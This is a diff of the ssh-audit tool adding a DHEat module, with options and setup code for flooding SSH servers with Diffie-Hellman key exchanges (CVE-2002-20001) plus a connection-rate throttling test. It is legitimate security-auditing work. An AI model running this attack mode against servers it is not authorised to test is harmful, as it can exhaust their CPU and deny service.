          "File: src/ssh_audit/auditconf.py -> src/ssh_audit/auditconf.py",
          "--- Hunk 1 ---",
          "[Context before]",
          "1: \"\"\"",
          "2:    The MIT License (MIT)",
          "5:    Copyright (C) 2017 Andris Raugulis (moo@arthepsy.eu)",
          "7:    Permission is hereby granted, free of charge, to any person obtaining a copy",
          "",
          "[Removed Lines]",
          "4:    Copyright (C) 2017-2021 Joe Testa (jtesta@positronsecurity.com)",
          "",
          "[Added Lines]",
          "4:    Copyright (C) 2017-2024 Joe Testa (jtesta@positronsecurity.com)",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "60:         self.manual = False",
          "61:         self.debug = False",
          "62:         self.gex_test = ''",
          "64:     def __setattr__(self, name: str, value: Union[str, int, float, bool, Sequence[int]]) -> None:",
          "65:         valid = False",
          "67:             valid, value = True, bool(value)",
          "68:         elif name in ['ipv4', 'ipv6']:",
          "69:             valid, value = True, bool(value)",
          "",
          "[Removed Lines]",
          "66:         if name in ['batch', 'client_audit', 'colors', 'json', 'json_print_indent', 'list_policies', 'manual', 'make_policy', 'ssh1', 'ssh2', 'timeout_set', 'verbose', 'debug']:",
          "",
          "[Added Lines]",
          "63:         self.dheat: Optional[str] = None",
          "64:         self.dheat_concurrent_connections: int = 0",
          "65:         self.dheat_e_length: int = 0",
          "66:         self.dheat_target_alg: str = \"\"",
          "67:         self.skip_rate_test = False",
          "68:         self.conn_rate_test: str = \"1:1\"",
          "69:         self.conn_rate_test_enabled = False",
          "70:         self.conn_rate_test_threads = 0",
          "71:         self.conn_rate_test_target_rate = 0",
          "76:         if name in ['batch', 'client_audit', 'colors', 'json', 'json_print_indent', 'list_policies', 'manual', 'make_policy', 'ssh1', 'ssh2', 'timeout_set', 'verbose', 'debug', 'skip_rate_test']:",
          "",
          "---------------",
          "--- Hunk 3 ---",
          "[Context before]",
          "94:             if num_threads < 1:",
          "95:                 raise ValueError('invalid number of threads: {}'.format(value))",
          "96:             value = num_threads",
          "98:         if valid:",
          "99:             object.__setattr__(self, name, value)",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "107:         elif name == \"dheat\":",
          "108:             # Valid values:",
          "109:             #   * None",
          "110:             #   * \"10\" (concurrent-connections)",
          "111:             #   * \"10:diffie-hellman-group18-sha512\" (concurrent-connections:target-alg)",
          "112:             #   * \"10:diffie-hellman-group18-sha512:100\" (concurrent-connections:target-alg:e-length)",
          "113:             valid = True",
          "114:             if value is not None:",
          "116:                 def _parse_concurrent_connections(s: str) -> int:",
          "117:                     if Utils.parse_int(s) < 1:",
          "118:                         raise ValueError(\"number of concurrent connections must be 1 or greater: {}\".format(s))",
          "119:                     return int(s)",
          "121:                 def _parse_e_length(s: str) -> int:",
          "122:                     s_int = Utils.parse_int(s)",
          "123:                     if s_int < 2:",
          "124:                         raise ValueError(\"length of e must not be less than 2: {}\".format(s))",
          "125:                     return s_int",
          "127:                 def _parse_target_alg(s: str) -> str:",
          "128:                     if len(s) == 0:",
          "129:                         raise ValueError(\"target algorithm must not be the empty string.\")",
          "130:                     return s",
          "132:                 value = str(value)",
          "133:                 fields = value.split(':')",
          "135:                 self.dheat_concurrent_connections = _parse_concurrent_connections(fields[0])",
          "137:                 # Parse the target algorithm if present.",
          "138:                 if len(fields) >= 2:",
          "139:                     self.dheat_target_alg = _parse_target_alg(fields[1])",
          "141:                 # Parse the length of e, if present.",
          "142:                 if len(fields) == 3:",
          "143:                     self.dheat_e_length = _parse_e_length(fields[2])",
          "145:                 if len(fields) > 3:",
          "146:                     raise ValueError(\"only three fields are expected instead of {}: {}\".format(len(fields), value))",
          "148:         elif name in [\"dheat_concurrent_connections\", \"dheat_e_length\"]:",
          "149:             valid = True",
          "150:             if not isinstance(value, int):",
          "151:                 valid = False",
          "153:         elif name == \"dheat_target_alg\":",
          "154:             valid = True",
          "155:             if not isinstance(value, str):",
          "156:                 valid = False",
          "158:         elif name == \"conn_rate_test\":",
          "159:             # Valid values:",
          "160:             #   * \"4\" (run rate test with 4 threads)",
          "161:             #   * \"4:100\" (run rate test with 4 threads, targeting 100 connections/second)",
          "163:             error_msg = \"valid format for {:s} is \\\"N\\\" or \\\"N:N\\\", where N is an integer.\".format(name)",
          "164:             self.conn_rate_test_enabled = True",
          "165:             fields = str(value).split(\":\")",
          "167:             if len(fields) > 2 or len(fields) == 0:",
          "168:                 raise ValueError(error_msg)",
          "169:             else:",
          "170:                 self.conn_rate_test_threads = int(fields[0])",
          "171:                 if self.conn_rate_test_threads < 1:",
          "172:                     raise ValueError(\"number of threads must be 1 or greater.\")",
          "174:                 self.conn_rate_test_target_rate = 0",
          "175:                 if len(fields) == 2:",
          "176:                     self.conn_rate_test_target_rate = int(fields[1])",
          "177:                     if self.conn_rate_test_target_rate < 1:",
          "178:                         raise ValueError(\"rate target must be 1 or greater.\")",
          "180:         elif name == \"conn_rate_test_enabled\":",
          "181:             valid = True",
          "182:             if not isinstance(value, bool):",
          "183:                 valid = False",
          "185:         elif name in [\"conn_rate_test_threads\", \"conn_rate_test_target_rate\"]:",
          "186:             valid = True",
          "187:             if not isinstance(value, int):",
          "188:                 valid = False",
          "",
          "---------------"
        ],
        "src/ssh_audit/dheat.py||src/ssh_audit/dheat.py": [
          "File: src/ssh_audit/dheat.py -> src/ssh_audit/dheat.py",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: \"\"\"",
          "2:    The MIT License (MIT)",
          "4:    Copyright (C) 2023-2024 Joe Testa (jtesta@positronsecurity.com)",
          "6:    Permission is hereby granted, free of charge, to any person obtaining a copy",
          "7:    of this software and associated documentation files (the \"Software\"), to deal",
          "8:    in the Software without restriction, including without limitation the rights",
          "9:    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell",
          "10:    copies of the Software, and to permit persons to whom the Software is",
          "11:    furnished to do so, subject to the following conditions:",
          "13:    The above copyright notice and this permission notice shall be included in",
          "14:    all copies or substantial portions of the Software.",
          "16:    THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR",
          "17:    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,",
          "18:    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE",
          "19:    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER",
          "20:    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,",
          "21:    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN",
          "22:    THE SOFTWARE.",
          "23: \"\"\"",
          "24: import multiprocessing",
          "25: import os",
          "26: import queue",
          "27: import random",
          "28: import select",
          "29: import socket",
          "30: import struct",
          "31: import time",
          "32: import traceback",
          "34: from typing import Any, Dict, List, Optional, Tuple",
          "36: from ssh_audit.auditconf import AuditConf",
          "37: from ssh_audit.banner import Banner",
          "38: from ssh_audit import exitcodes",
          "39: from ssh_audit.gextest import GEXTest",
          "40: from ssh_audit.globals import SSH_HEADER",
          "41: from ssh_audit.ssh_socket import SSH_Socket",
          "42: from ssh_audit.ssh2_kex import SSH2_Kex",
          "43: from ssh_audit.outputbuffer import OutputBuffer",
          "44: from ssh_audit.writebuf import WriteBuf",
          "47: class DHEat:",
          "49:     # Maximum number of connections per second the server can allow until a warning is issued when Diffie-Hellman algorithms are supported.",
          "50:     MAX_SAFE_RATE = 20.0",
          "52:     # The warning added to DH algorithms in the UI when dh_rate_test determines that no throttling is being done.",
          "53:     DHEAT_WARNING = \"Potentially insufficient connection throttling detected, resulting in possible vulnerability to the DHEat DoS attack (CVE-2002-20001).  Either connection throttling or removal of Diffie-Hellman key exchanges is necessary to remediate this issue.  Suppress this test/message with --skip-rate-test.  Additional info: {connections:d} connections were created in {time_elapsed:.3f} seconds, or {rate:.1f} conns/sec; server must respond with a rate less than {max_safe_rate:.1f} conns/sec to be considered safe.\"",
          "55:     # List of the Diffie-Hellman group exchange algorithms this test supports.",
          "56:     gex_algs = [",
          "57:         \"diffie-hellman-group-exchange-sha256\",  # Implemented in OpenSSH.",
          "58:         \"diffie-hellman-group-exchange-sha1\",    # Implemented in OpenSSH.",
          "59:         \"diffie-hellman-group-exchange-sha224@ssh.com\",",
          "60:         \"diffie-hellman-group-exchange-sha256@ssh.com\",",
          "61:         \"diffie-hellman-group-exchange-sha384@ssh.com\",",
          "62:         \"diffie-hellman-group-exchange-sha512@ssh.com\",",
          "63:     ]",
          "65:     # List of key exchange algorithms, sorted by largest modulus size.",
          "66:     alg_priority = [",
          "67:         \"diffie-hellman-group18-sha512\",  # Implemented in OpenSSH.",
          "68:         \"diffie-hellman-group18-sha512@ssh.com\",",
          "69:         \"diffie-hellman-group17-sha512\",",
          "70:         \"diffie-hellman_group17-sha512\",  # Note that this is not the same as the one above it.",
          "71:         \"diffie-hellman-group16-sha512\",  # Implemented in OpenSSH.",
          "72:         \"diffie-hellman-group16-sha256\",",
          "73:         \"diffie-hellman-group16-sha384@ssh.com\",",
          "74:         \"diffie-hellman-group16-sha512\",",
          "75:         \"diffie-hellman-group16-sha512@ssh.com\",",
          "76:         \"diffie-hellman-group15-sha256\",",
          "77:         \"diffie-hellman-group15-sha256@ssh.com\",",
          "78:         \"diffie-hellman-group15-sha384@ssh.com\",",
          "79:         \"diffie-hellman-group15-sha512\",",
          "80:         \"diffie-hellman-group14-sha256\",  # Implemented in OpenSSH.",
          "81:         \"diffie-hellman-group14-sha1\",    # Implemented in OpenSSH.",
          "82:         \"diffie-hellman-group14-sha224@ssh.com\",",
          "83:         \"diffie-hellman-group14-sha256@ssh.com\",",
          "84:         \"diffie-hellman-group1-sha1\",     # Implemented in OpenSSH.",
          "85:         \"diffie-hellman-group1-sha256\",",
          "86:         \"curve25519-sha256\",              # Implemented in OpenSSH.",
          "87:         \"curve25519-sha256@libssh.org\",   # Implemented in OpenSSH.",
          "88:         \"ecdh-sha2-nistp256\",             # Implemented in OpenSSH.",
          "89:         \"ecdh-sha2-nistp384\",             # Implemented in OpenSSH.",
          "90:         \"ecdh-sha2-nistp521\",             # Implemented in OpenSSH.",
          "91:         \"sntrup761x25519-sha512@openssh.com\",  # Implemented in OpenSSH.",
          "92:     ]",
          "94:     # Dictionary of key exchanges mapped to their modulus size.",
          "95:     alg_modulus_sizes = {",
          "96:         \"diffie-hellman-group18-sha512\": 8192,",
          "97:         \"diffie-hellman-group18-sha512@ssh.com\": 8192,",
          "98:         \"diffie-hellman-group17-sha512\": 6144,",
          "99:         \"diffie-hellman_group17-sha512\": 6144,",
          "100:         \"diffie-hellman-group16-sha512\": 4096,",
          "101:         \"diffie-hellman-group16-sha256\": 4096,",
          "102:         \"diffie-hellman-group16-sha384@ssh.com\": 4096,",
          "103:         \"diffie-hellman-group16-sha512@ssh.com\": 4096,",
          "104:         \"diffie-hellman-group15-sha256\": 3072,",
          "105:         \"diffie-hellman-group15-sha256@ssh.com\": 3072,",
          "106:         \"diffie-hellman-group15-sha384@ssh.com\": 3072,",
          "107:         \"diffie-hellman-group15-sha512\": 3072,",
          "108:         \"diffie-hellman-group14-sha256\": 2048,",
          "109:         \"diffie-hellman-group14-sha1\": 2048,",
          "110:         \"diffie-hellman-group14-sha224@ssh.com\": 2048,",
          "111:         \"diffie-hellman-group14-sha256@ssh.com\": 2048,",
          "112:         \"diffie-hellman-group1-sha1\": 1024,",
          "113:         \"diffie-hellman-group1-sha256\": 1024,",
          "114:         \"curve25519-sha256\": (31 * 8),",
          "115:         \"curve25519-sha256@libssh.org\": (31 * 8),",
          "116:         \"ecdh-sha2-nistp256\": (64 * 8),",
          "117:         \"ecdh-sha2-nistp384\": (96 * 8),",
          "118:         \"ecdh-sha2-nistp521\": (132 * 8),",
          "119:         \"sntrup761x25519-sha512@openssh.com\": (1189 * 8),",
          "120:     }",
          "122:     # List of DH algorithms that have been validated by the maintainer.  There is quite the long list of DH algorithms available (see above), and testing them all would require a lot of time as many are not implemented in OpenSSH.  So perhaps the community can help with testing...",
          "123:     tested_algs = [\"diffie-hellman-group18-sha512\", \"diffie-hellman-group16-sha512\", \"diffie-hellman-group-exchange-sha256\", \"ecdh-sha2-nistp256\", \"ecdh-sha2-nistp384\", \"ecdh-sha2-nistp521\", \"curve25519-sha256\", \"curve25519-sha256@libssh.org\", \"sntrup761x25519-sha512@openssh.com\"]",
          "125:     # If a DH algorithm is used that is not in the tested_algs list, above, then write this notice to the user.",
          "126:     untested_alg_notice = \"{color_start:s}NOTE:{color_end:s} the target DH algorithm ({dh_alg:s}) has not been tested by the maintainer.  If you can verify that the server's CPU is fully utilized, please copy/paste this output to jtesta@positronsecurity.com.\"",
          "128:     # Hardcoded ECDH ephemeral public keys for NIST-P256, NIST-P384, and NIST-P521.  These need to lie on the ellipical curve in order to be accepted by the server, so generating them quickly isn't easy without an external crypto library.  So we'll just use some hardcoded ones.",
          "129:     HARDCODED_NISTP256 = b\"\\x04\\x9d\\x32\\xad\\x75\\x68\\xc3\\x43\\x30\\x12\\x1b\\x64\\x5d\\x12\\x3e\\x18\\x7b\\xd2\\x5a\\xd6\\x42\\x6b\\xb5\\xab\\xa3\\x16\\xda\\x64\\xe7\\x15\\x22\\xd2\\x66\\xae\\xcb\\xcc\\x9c\\x64\\x57\\x32\\x76\\x41\\x74\\xeb\\xff\\xda\\x28\\xd6\\x6e\\x10\\x98\\x60\\x56\\x74\\x30\\x37\\x97\\xd2\\x7f\\x29\\xd9\\x99\\xf1\\x58\\x8a\"",
          "130:     HARDCODED_NISTP384 = b\"\\x04\\x94\\xd9\\xd2\\x49\\xac\\xb6\\x23\\x59\\x47\\x32\\x50\\x5f\\xaf\\x55\\x6e\\x7a\\x4a\\x00\\x82\\xd9\\xb1\\x4c\\xe4\\x61\\x05\\x70\\x91\\x99\\x19\\xbe\\x84\\x2d\\x3a\\x74\\x7c\\xd8\\xd1\\xc1\\x1a\\x5c\\xbf\\xd3\\x33\\xcb\\x25\\x51\\x1c\\x66\\x76\\x53\\x04\\x92\\x4f\\xb3\\x1f\\x9b\\x19\\xba\\x6b\\x1a\\xe2\\x91\\x04\\xc6\\x4c\\x9c\\xec\\xa9\\x43\\xd0\\x2e\\x08\\x4b\\x2a\\x50\\xcf\\x31\\x46\\xb3\\x6c\\x29\\xd0\\xf1\\x26\\x9e\\x57\\x17\\xe1\\xf8\\x29\\xce\\xb5\\x9a\\x96\\x2b\\x94\"",
          "131:     HARDCODED_NISTP521 = b\"\\x04\\x00\\x51\\xb7\\xf4\\x51\\x54\\x7c\\x60\\xd9\\xe8\\x90\\x8f\\x40\\xcd\\x05\\x7e\\x75\\xcf\\xfc\\x3b\\xe8\\xa6\\x45\\x8b\\xe3\\xb5\\x99\\x75\\xf6\\x42\\xef\\x34\\x5a\\x9a\\x86\\x90\\x43\\x52\\x62\\x49\\xd9\\x62\\x50\\xc0\\xb7\\xdd\\xe0\\x34\\x2e\\x25\\x3f\\x3e\\x1f\\x19\\xdd\\xf5\\xc9\\x11\\xe4\\x6f\\xd0\\xe2\\x59\\x86\\xc3\\x7b\\x01\\xd3\\xf7\\x5a\\x28\\x72\\x73\\x3c\\x7e\\x4d\\x8f\\x08\\x2a\\x70\\x94\\x93\\x83\\xe2\\xed\\xf2\\xd6\\xf6\\x3e\\x63\\xb8\\xb9\\xaa\\x83\\x2a\\xd3\\x96\\xca\\xde\\x38\\x62\\x19\\x1e\\x84\\x84\\xad\\xfe\\x06\\xfc\\x2b\\xb2\\x1b\\x79\\x63\\xfc\\x1e\\x6d\\x85\\x14\\xba\\x3c\\x64\\xd9\\x64\\x75\\xd5\\x74\\xcb\\x5b\\x3d\\xc3\\x9f\"",
          "133:     # Algorithms that must use hard-coded e values.",
          "134:     HARDCODED_ALGS = [\"ecdh-sha2-nistp256\", \"ecdh-sha2-nistp384\", \"ecdh-sha2-nistp521\"]",
          "136:     # Post-quantum algorithms matched with traditional crypto.",
          "137:     COMPLEX_PQ_ALGS = [\"sntrup761x25519-sha512@openssh.com\"]",
          "139:     CLEAR = \"\"",
          "140:     BLUEB = \"\"",
          "141:     GREENB = \"\"",
          "142:     PURPLEB = \"\"",
          "143:     REDB = \"\"",
          "144:     WHITEB = \"\"",
          "145:     YELLOWB = \"\"",
          "146:     BAR_CHART = \" \"",
          "147:     CHART_UPWARDS = \" \"",
          "149:     def __init__(self, out: 'OutputBuffer', aconf: 'AuditConf', banner: Optional['Banner'], kex: 'SSH2_Kex') -> None:",
          "150:         self.out = out",
          "151:         self.target = aconf.host",
          "152:         self.port = aconf.port",
          "154:         # We'll use the server's banner as our own.  Otherwise, use ssh-audit's default.",
          "155:         self.banner = SSH_HEADER.format(\"2.0\").encode(\"utf-8\") + b\"\\r\\n\"",
          "156:         if banner is not None:",
          "157:             self.banner = str(banner).encode(\"utf-8\") + b\"\\r\\n\"",
          "159:         # The SSH2_Kex object that we recieved from the server in a prior connection.  We'll use it as a template to craft our own kex.",
          "160:         self.kex = kex",
          "162:         # The connection and read timeouts.",
          "163:         self.connect_timeout = aconf.timeout",
          "164:         self.read_timeout = aconf.timeout",
          "166:         # True when we are in debug mode.",
          "167:         self.debug_mode = aconf.debug",
          "169:         # The length of our fake e value to give to the server.  It is automatically set based on the DH modulus size we are targeting, or by the user for advanced testing.",
          "170:         self.e_rand_len = 0",
          "172:         # The SSH Key Exchange Init message.  This is the same for each connection (minus the random 16-byte cookie field, so it will be pre-computed to save time.",
          "173:         self.kex_init_body = b''",
          "175:         # Disable buffered output.",
          "176:         self.out.buffer_output = False",
          "178:         # We'll use a weak/fast PRNG to generate the most significant byte of our fake e response to the server.",
          "179:         random.seed()",
          "181:         # Attack statistics.",
          "182:         self.num_attempted_tcp_connections = 0",
          "183:         self.num_successful_tcp_connections = 0",
          "184:         self.num_successful_dh_kex = 0",
          "185:         self.num_failed_dh_kex = 0",
          "186:         self.num_bytes_written = 0",
          "187:         self.num_connect_timeouts = 0",
          "188:         self.num_read_timeouts = 0",
          "189:         self.num_socket_exceptions = 0",
          "190:         self.num_openssh_throttled_connections = 0",
          "192:         # The time we started the attack.",
          "193:         self.start_timer = 0.0",
          "195:         # The number of concurrent sockets to open with the server.",
          "196:         self.concurrent_connections = 10",
          "198:         # The key exchange algorithm name that we are targeting on the server.  If empty, we will choose the best available option.  Otherwise, it is set by the user.",
          "199:         self.target_kex = \"\"",
          "201:         self.user_set_e_len = False",
          "202:         self.send_all_packets_at_once = False",
          "203:         if aconf.dheat is not None:",
          "204:             self.concurrent_connections = aconf.dheat_concurrent_connections",
          "205:             self.target_kex = aconf.dheat_target_alg",
          "207:             # If the user specified a length of e to use instead of the correct length determined at run-time.",
          "208:             if aconf.dheat_e_length > 0:",
          "209:                 self.send_all_packets_at_once = True  # If the user specified the e length (which is non-standard), we'll also send all SSH packets at once to reduce latency (which is also non-standard).  This involves sending the banner, KEX INIT, DH KEX INIT all in the same packet without waiting for the server to respond to them individually.",
          "210:                 self.user_set_e_len = True",
          "211:                 self.e_rand_len = aconf.dheat_e_length",
          "213:         # User wants to perform a rate test.",
          "214:         self.rate_test = False",
          "215:         self.target_rate = 0  # When performing a rate test, this is the number of successful connections per second we are targeting.  0=no rate limit.",
          "216:         if aconf.conn_rate_test_enabled:",
          "217:             self.rate_test = True",
          "218:             self.concurrent_connections = aconf.conn_rate_test_threads",
          "219:             self.target_rate = aconf.conn_rate_test_target_rate",
          "221:         # Set the color flags & emjojis, if applicable.",
          "222:         if aconf.colors:",
          "223:             DHEat.CLEAR = \"\\033[0m\"",
          "224:             DHEat.WHITEB = \"\\033[1;97m\"",
          "225:             DHEat.BLUEB = \"\\033[1;94m\"    # Blue + bold",
          "226:             DHEat.PURPLEB = \"\\033[1;95m\"  # Purple + bold",
          "227:             DHEat.YELLOWB = \"\\033[1;93m\"  # Yellow + bold",
          "228:             DHEat.GREENB = \"\\033[1;92m\"   # Green + bold",
          "229:             DHEat.REDB = \"\\033[1;91m\"     # Red + bold",
          "230:             DHEat.BAR_CHART = \"\\U0001F4CA\"  # The bar chart emoji.",
          "231:             DHEat.CHART_UPWARDS = \"\\U0001F4C8\"  # The upwards chart emoji.",
          "234:     @staticmethod",
          "235:     def add_byte_units(n: float) -> str:",
          "236:         '''Converts a number of bytes to a human-readable representation (i.e.: 10000 -> \"9.8KB\").'''",
          "238:         if n >= 1073741824:",
          "239:             return \"%.1fGB\" % (n / 1073741824)",
          "240:         if n >= 1048576:",
          "241:             return \"%.1fMB\" % (n / 1048576)",
          "242:         if n >= 1024:",
          "243:             return \"%.1fKB\" % (n / 1024)",
          "245:         return \"%u bytes\" % n",
          "248:     def analyze_gex(self, server_gex_alg: str) -> int:",
          "249:         '''Analyzes a server's Diffie-Hellman group exchange algorithm.  The largest modulus it supports is determined, then it is inserted into DHEat.alg_priority list while maintaining order by largest modulus.  The largest modulus is also returned.'''",
          "251:         self.output(\"Analyzing server's group exchange algorithm, %s, to find largest modulus it supports...\" % (server_gex_alg))",
          "253:         largest_bit_modulus = 0",
          "254:         try:",
          "255:             largest_bit_modulus = self.get_largest_gex_modulus(server_gex_alg)",
          "256:         except Exception:",
          "257:             # On exception, simply print the stack trace and continue on.",
          "258:             traceback.print_exc()",
          "260:         if largest_bit_modulus > 0:",
          "261:             DHEat.alg_modulus_sizes[server_gex_alg] = largest_bit_modulus",
          "262:             self.debug(\"GEX algorithm [%s] supports a max modulus of %u bits.\" % (server_gex_alg, largest_bit_modulus))",
          "264:             # Now that we have the largest modulus for this GEX, insert it into the prioritized list of algorithms.  If, say, there are three 8192-bit kex algorithms in the list, we'll insert it as the 4th entry, as plain KEX algorithms require less network activity to trigger than GEX.",
          "265:             i = 0",
          "266:             inserted = False",
          "267:             while i < len(DHEat.alg_priority):",
          "268:                 prioritized_alg = DHEat.alg_priority[i]",
          "269:                 prioritized_alg_size = DHEat.alg_modulus_sizes[prioritized_alg]",
          "270:                 if largest_bit_modulus > prioritized_alg_size + 1:  # + 1 to ensure algs with equal number of bits keep priority over this GEX.",
          "271:                     DHEat.alg_priority.insert(i, server_gex_alg)",
          "272:                     inserted = True",
          "273:                     self.debug(\"Inserted %s into prioritized algorithm list at index %u: [%s]\" % (server_gex_alg, i, \", \".join(DHEat.alg_priority)))",
          "274:                     break",
          "276:                 i += 1",
          "278:             # Handle the case where all existing algs have a larger modulus.",
          "279:             if inserted is False:",
          "280:                 DHEat.alg_priority.append(server_gex_alg)",
          "281:                 self.debug(\"Appended %s to end of prioritized algorithm list: [%s]\" % (server_gex_alg, \", \".join(DHEat.alg_priority)))",
          "283:         self.output(\"The largest modulus supported by %s appears to be %u.\" % (server_gex_alg, largest_bit_modulus))",
          "284:         return largest_bit_modulus",
          "287:     def debug(self, s: str) -> None:",
          "288:         '''Prints a string to the console when debugging mode is enabled.'''",
          "290:         self.out.d(s)",
          "293:     @staticmethod",
          "294:     def dh_rate_test(out: 'OutputBuffer', aconf: 'AuditConf', kex: 'SSH2_Kex', max_time: float, max_connections: int, concurrent_sockets: int) -> str:",
          "295:         '''Attempts to quickly create many sockets to the target server.  This simulates the DHEat attack without causing an actual DoS condition.  If a rate greater than MAX_SAFE_RATE is allowed, then a warning string is returned.'''",
          "297:         # Gracefully handle when the user presses CTRL-C to break the interactive rate test.",
          "298:         ret = \"\"",
          "299:         try:",
          "300:             ret = DHEat._dh_rate_test(out, aconf, kex, max_time, max_connections, concurrent_sockets)",
          "301:         except KeyboardInterrupt:",
          "302:             print()",
          "304:         return ret",
          "307:     @staticmethod",
          "308:     def _dh_rate_test(out: 'OutputBuffer', aconf: 'AuditConf', kex: 'SSH2_Kex', max_time: float, max_connections: int, concurrent_sockets: int) -> str:",
          "309:         '''Attempts to quickly create many sockets to the target server.  This simulates the DHEat attack without causing an actual DoS condition.  If a rate greater than MAX_SAFE_RATE is allowed, then a warning string is returned.'''",
          "311:         def _close_socket(socket_list: List[socket.socket], s: socket.socket) -> None:",
          "312:             try:",
          "313:                 s.shutdown(socket.SHUT_RDWR)",
          "314:                 s.close()",
          "315:             except OSError:",
          "316:                 pass",
          "318:             socket_list.remove(s)",
          "321:         spinner = [\"-\", \"\\\\\", \"|\", \"/\"]",
          "322:         spinner_index = 0",
          "324:         # If the user passed --conn-rate-test, then we'll perform an interactive rate test against the target.",
          "325:         interactive = False",
          "326:         if aconf.conn_rate_test_enabled:",
          "327:             interactive = True",
          "328:             max_connections = 999999999999999999",
          "329:             concurrent_sockets = aconf.conn_rate_test_threads",
          "331:             DHEat.CLEAR = \"\\033[0m\"",
          "332:             DHEat.WHITEB = \"\\033[1;97m\"",
          "333:             DHEat.BLUEB = \"\\033[1;94m\"",
          "335:             rate_str = \"\"",
          "336:             if aconf.conn_rate_test_target_rate > 0:",
          "337:                 rate_str = \" at a max rate of %s%u%s connections per second\" % (DHEat.WHITEB, aconf.conn_rate_test_target_rate, DHEat.CLEAR)",
          "339:             print()",
          "340:             print(\"Performing non-disruptive rate test against %s[%s]:%u%s with %s%u%s concurrent sockets%s.  No Diffie-Hellman requests will be sent.\" % (DHEat.WHITEB, aconf.host, aconf.port, DHEat.CLEAR, DHEat.WHITEB, concurrent_sockets, DHEat.CLEAR, rate_str))",
          "341:             print()",
          "343:         else:  # We'll do a non-interactive test as part of a standard audit.",
          "344:             # Ensure that the server supports at least one DH algorithm.  Otherwise, this test is pointless.",
          "345:             server_dh_kex = []",
          "346:             for server_kex in kex.kex_algorithms:",
          "347:                 if (server_kex in DHEat.alg_priority) or (server_kex in DHEat.gex_algs):",
          "348:                     server_dh_kex.append(server_kex)",
          "350:             if len(server_dh_kex) == 0:",
          "351:                 out.d(\"Skipping DHEat.dh_rate_test() since server does not support any DH algorithms: [%s]\" % \", \".join(kex.kex_algorithms))",
          "352:                 return \"\"",
          "353:             else:",
          "354:                 out.d(\"DHEat.dh_rate_test(): starting test; parameters: %f seconds, %u max connections, %u concurrent sockets.\" % (max_time, max_connections, concurrent_sockets))",
          "356:         num_attempted_connections = 0",
          "357:         num_opened_connections = 0",
          "358:         socket_list: List[socket.socket] = []",
          "359:         start_timer = time.time()",
          "360:         last_update = start_timer",
          "361:         while True:",
          "363:             # During non-interactive tests, limit based on time and number of connections.  Otherwise, we loop indefinitely until the user presses CTRL-C.",
          "364:             if (interactive is False) and ((time.time() - start_timer) >= max_time) and (num_opened_connections >= max_connections):",
          "365:                 break",
          "367:             # Give the user some interactive feedback.",
          "368:             if interactive:",
          "369:                 now = time.time()",
          "370:                 if (now - last_update) >= 1.0:",
          "371:                     seconds_running = now - start_timer",
          "372:                     print(\"%s%s%s Run time: %s%.1f%s; TCP SYNs: %s%u%s; Compl. conns: %s%u%s; TCP SYNs/sec: %s%.1f%s; Compl. conns/sec: %s%.1f%s    \\r\" % (DHEat.WHITEB, spinner[spinner_index], DHEat.CLEAR, DHEat.WHITEB, seconds_running, DHEat.CLEAR, DHEat.WHITEB, num_attempted_connections, DHEat.CLEAR, DHEat.WHITEB, num_opened_connections, DHEat.CLEAR, DHEat.BLUEB, num_attempted_connections / seconds_running, DHEat.CLEAR, DHEat.BLUEB, num_opened_connections / seconds_running, DHEat.CLEAR), end=\"\")",
          "373:                     last_update = now",
          "374:                     spinner_index = (spinner_index + 1) % 4",
          "376:                 # If a max rate per second was specified, calculate the amount of time to sleep so we don't exceed it.",
          "377:                 if aconf.conn_rate_test_target_rate > 0:",
          "378:                     time_so_far = now - start_timer",
          "379:                     current_rate = num_opened_connections / time_so_far",
          "380:                     if current_rate > aconf.conn_rate_test_target_rate:",
          "381:                         sleep_time = num_opened_connections / (aconf.conn_rate_test_target_rate * time_so_far)",
          "382:                         if sleep_time > 0.0:",
          "383:                             time.sleep(sleep_time)",
          "385:             while (len(socket_list) < concurrent_sockets) and (len(socket_list) + num_opened_connections < max_connections):",
          "386:                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
          "387:                 s.setblocking(False)",
          "389:                 out.d(\"Creating socket (%u of %u already exist)...\" % (len(socket_list), concurrent_sockets))",
          "390:                 ret = s.connect_ex((aconf.host, aconf.port))",
          "391:                 num_attempted_connections += 1",
          "392:                 if ret in [0, 115]:  # Check if connection is successful or EINPROGRESS.",
          "393:                     socket_list.append(s)",
          "395:             rlist, _, elist = select.select(socket_list, [], socket_list, 0.1)",
          "397:             # For each socket that has something for us to read...",
          "398:             for s in rlist:",
          "399:                 buf = b''",
          "400:                 try:",
          "401:                     buf = s.recv(8)",
          "402:                 except (ConnectionResetError, BrokenPipeError):",
          "403:                     _close_socket(socket_list, s)",
          "404:                     continue",
          "406:                 # If we received the SSH header, we'll count this as an opened connection.",
          "407:                 if buf.startswith(b\"SSH-\"):",
          "408:                     num_opened_connections += 1",
          "409:                     out.d(\"Number of opened connections: %u (max: %u).\" % (num_opened_connections, max_connections))",
          "411:                 _close_socket(socket_list, s)",
          "413:                 # Since we just closed the socket, ensure its not in the exception list.",
          "414:                 if s in elist:",
          "415:                     elist.remove(s)",
          "417:             # Close all sockets that are in the exception state.",
          "418:             for s in elist:",
          "419:                 _close_socket(socket_list, s)",
          "421:         # Close any remaining sockets.",
          "422:         while len(socket_list) > 0:",
          "423:             _close_socket(socket_list, socket_list[0])",
          "425:         time_elapsed = time.time() - start_timer",
          "426:         out.d(\"DHEat.dh_rate_test() results: time elapsed: %f; connections created: %u\" % (time_elapsed, num_opened_connections))",
          "428:         note = \"\"",
          "429:         rate = 0.0",
          "430:         if time_elapsed > 0.0 and num_opened_connections > 0:",
          "431:             rate = num_opened_connections / time_elapsed",
          "432:             out.d(\"DHEat.dh_rate_test() results: %.1f connections opened per second.\" % rate)",
